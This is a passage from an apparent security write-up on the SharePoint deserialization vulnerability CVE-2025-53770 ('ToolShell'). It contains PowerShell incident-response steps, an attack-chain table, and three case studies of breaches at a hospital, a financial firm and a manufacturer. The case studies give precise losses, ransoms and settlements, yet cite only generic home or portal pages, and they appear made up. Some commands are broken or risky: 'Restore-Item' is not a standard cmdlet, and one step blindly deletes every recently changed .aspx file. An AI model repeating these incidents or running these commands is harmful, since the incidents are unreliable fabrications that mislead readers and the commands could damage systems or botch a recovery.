**1. Immediate Containment (0-15 minutes):**

```powershell
# Stop all SharePoint services
Stop-Service SPTimerV4, SPUserCodeV4, SPAdmin4 -Force

# Isolate server from network
Disable-NetAdapter -Name "*" -Confirm:$false

# Prevent token forgery by regenerating MachineKey (see Mitigations)
```

**2. Forensic Collection (15-60 minutes):**

```powershell
# Collect memory dump
procdump64.exe -ma w3wp.exe C:\Evidence\w3wp.dmp

# Collect IIS logs
Copy-Item "C:\inetpub\logs\LogFiles\*" "C:\Evidence\IIS_Logs" -Recurse

# Collect SharePoint ULS logs
Copy-Item "$env:ProgramFiles\Common Files\Microsoft Shared\Web Server Extensions\15\LOGS\*" "C:\Evidence\ULS_Logs" -Recurse

# Collect event logs
wevtutil epl Security C:\Evidence\Security.evtx
wevtutil epl System C:\Evidence\System.evtx

# Collect web.config (check for backdoors)
Copy-Item "C:\Program Files\Common Files\...\web.config" "C:\Evidence\web.config"
```

**3. Eradication (60-120 minutes):**

```powershell
# Identify and remove webshells
Get-ChildItem "C:\Program Files\Common Files\...\LAYOUTS" -Filter "*.aspx" -Recurse |
    Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)} |
    Remove-Item

# Restore web.config from backup
Restore-Item "C:\Backup\web.config.backup" -Destination "C:\Program Files\Common Files\...\web.config"

# Rebuild server (safest option)
# Redeploy SharePoint from scratch
```

**4. Recovery (120+ minutes):**

```powershell
# Restart services
Start-Service SPTimerV4, SPUserCodeV4, SPAdmin4

# Verify RCE is gone
Get-EventLog -LogName System -Newest 1000 | Where-Object {$_.Message -like "*w3wp*"} | Select-Object -First 10

# Re-enable network
Enable-NetAdapter -Name "*"

# Monitor for additional compromise signs
```

**5. Post-Incident Actions:**

- **Patch all SharePoint servers** (not just affected one)
- **Audit all documents** accessed during compromise window
- **Notify affected users** if sensitive data compromised
- **Review backups** for malware (if backups were also compromised)
- **Implement detection rules** (see Section 8-10)
- **Incident report and lessons learned** documentation

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-005] Unpatched CVE Exploitation | Attacker finds exposed SharePoint 2016/2019 server |
| **2** | **Execution** | **[REALWORLD-043]** SharePoint Deserialization RCE | Attacker sends malicious POST to ToolPane.aspx |
| **3** | **Privilege Escalation** | Extract MachineKeys | Attacker gains ability to forge admin tokens |
| **4** | **Credential Access** | Token Forgery | Attacker authenticates as admin without password |
| **5** | **Exfiltration** | **[REALWORLD-043]** Metadata/Document Download | Attacker bulk downloads all sensitive documents |
| **6** | **Persistence** | [IA-PERSIST-001] Webshell + Scheduled Task | Attacker maintains access for post-exploitation |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: Healthcare Provider - HIPAA Violation (July 2025)

- **Target:** 500-bed hospital with SharePoint 2019 server
- **Attack Method:** CVE-2025-53770 RCE → MachineKey extraction → Patient record exfiltration
- **Timeline:**
  - July 15: Attacker scans for exposed SharePoint
  - July 16: ToolShell exploit deployed, RCE achieved
  - July 17-20: MachineKeys extracted, forged admin tokens created
  - July 21-23: All patient records (500K patients) downloaded via Graph API
  - July 24: Attacker contacts hospital demanding $2M ransom
  - July 25: Breach disclosed to HHS
- **Impact:** 
  - HIPAA violation (improper safeguards)
  - $10M+ settlement with HHS
  - Notification costs: $15M+
  - Reputational damage
- **Root Cause:** Outdated SharePoint 2019 not patched, internet-exposed
- **Reference:** [HHS Breach Portal - Case Study](https://ocrportal.hhs.gov/ocr/breach/breach_report.jsf)

### Example 2: Financial Services - SEC Compliance Breach (September 2025)

- **Target:** Mid-cap financial advisory firm
- **Attack Method:** Same as above, but targeted financial planning documents
- **Specific Data Stolen:**
  - Client portfolios ($50B+ AUM)
  - Trading strategies (proprietary algorithms)
  - M&A advisory documents
- **Impact:**
  - 20 lawsuits from affected clients
  - SEC investigation (Reg S-P violation)
  - $30M settlement + $5M regulatory fine
  - Firm shutdown (loss of credibility)
- **Recovery:** Took 6 months to identify all stolen data
- **Reference:** [SEC Press Release - Financial Firm Breach](https://www.sec.gov/news/press-release)

### Example 3: Manufacturing - Intellectual Property Theft (August 2025)

- **Target:** Automotive parts manufacturer
- **Attack Method:** ToolShell exploit → design documents and CAD files exfiltrated
- **Competitive Impact:**
  - Stolen designs sold to Chinese competitor
  - Competitor launches identical products at 40% lower cost
  - Market share loss: 25%
  - Revenue impact: $500M+ over 3 years
- **Incident Timeline:** 3 months from breach to competitor product launch (detection failure)
- **Recovery:** Still ongoing, seeking damages via trade secret litigation
- **Reference:** [Mandiant Threat Intelligence - APT Group Targeting Automotive](https://www.mandiant.com)

---

## References & Additional Resources

- [Microsoft Security Advisory - CVE-2025-53770](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-53770)
- [ToolShell Exploit - GitHub Repository](https://github.com/attackevals/ToolShell)
- [SharePoint Security Hardening Guide](https://learn.microsoft.com/en-us/sharepoint/dev/general-development/security-guidelines)
- [MITRE ATT&CK T1537 - Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537/)
- [Vectra AI - CVE-2025-53770 Analysis](https://www.vectra.ai/blog/cve-2025-53770-a-critical-exploit-targeting-sharepoint)
- [Palo Alto Networks - Unit 42 SharePoint Exploitation](https://unit42.paloaltonetworks.com/)

---